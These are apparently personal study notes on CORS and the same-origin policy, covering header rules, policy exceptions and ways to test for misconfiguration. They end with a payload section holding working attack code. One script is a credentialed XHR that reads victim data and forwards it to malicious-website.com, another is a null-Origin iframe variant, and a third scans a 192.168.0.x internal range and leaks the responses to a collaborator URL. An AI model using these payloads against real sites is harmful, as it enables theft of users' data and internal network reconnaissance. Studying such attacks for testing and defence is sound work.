# CORS

	CORS : Cross-Origin Resource Sharing
	SOP : Same-Origin Policy

###### notes:
- SOP prevent javascript codes of domain from accessing other domains response 
it prevent the access if the domain or the port are not equivalent
- SOP will allow access between different domains if both domains set the same domain name to object `document.domain`
- `Access-Control-Allow-Origin`  header set the origins that are allowed  to access response from the site, it maches the `Origin` from the request with `Access-Control-Allow-Origin` from the response, if matched the browser will allow code running on main site to access response from requested site
- the header `Access-Control-Allow-Credentials` default is false, if set to true the browser will permit sending requests with user cookies
- this combined headers are not allowed for security reasons.
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
- the header ``Access-Control-Request-Headers: Special-Request-Header`` asks for the allowed request methods 
- ###### CORS doesn't provide protection against CSRF attacks

###### some exceptions to the same-origin policy:
- some objects are writable but not readable cross-domain, such as `location` object or `location.href` from iframes or new windows
- some objects are readable but not writable cross-domain, such as `length` property of the window object and the `closed` property 
- the replace function can generally be called cross-domain on the location object `location.replace()`
- you can call certian functions cross-domain, such as the functions `close`, `blur`, `focus` on a new window, also `postMessage` function can be called on iframes 




###### CORS misconfig:
- change Origin header to the  `null` value 
- change Origin header to one that begins with the origin of the site
- change Origin header to one that ends with the origin of the site
- harmless xss can be harmful if the vuln site is trusted by domain that contain sensitive information


###### payloads:
- simple payload 
```javascript
var req = new XMLHttpRequest(); req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; req.send(); function reqListener() { 
location='//malicious-website.com/log?key='+this.responseText; };
```
- create cross-origin contain the value `null` in the Origin header
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='malicious-website.com/log?key='+this.responseText; }; </script>"></iframe>
```
- access internal network via CORS attacks
```html
<script>
    var q = [],
        collaboratorURL = 'http://$collaboratorPayload';
for (i = 1; i <= 255; i++) {
    q.push(function(url) {
        return function(wait) {
            fetchUrl(url, wait);
        }
    }('http://192.168.0.' + i + ':8080'));
}
for (i = 1; i <= 20; i++) {
    if (q.length) q.shift()(i * 100);
}

function fetchUrl(url, wait) {
    var controller = new AbortController(),
        signal = controller.signal;
    fetch(url, {
        signal
    }).then(r => r.text().then(text => {
        location = collaboratorURL + '?ip=' + url.replace(/^http:\/\//, '') + '&code=' + encodeURIComponent(text) + '&' + Date.now();
    })).catch(e => {
        if (q.length) {
            q.shift()(wait);
        }
    });
    setTimeout(x => {
        controller.abort();
        if (q.length) {
            q.shift()(wait);
        }
    }, wait);
} 
</script>
```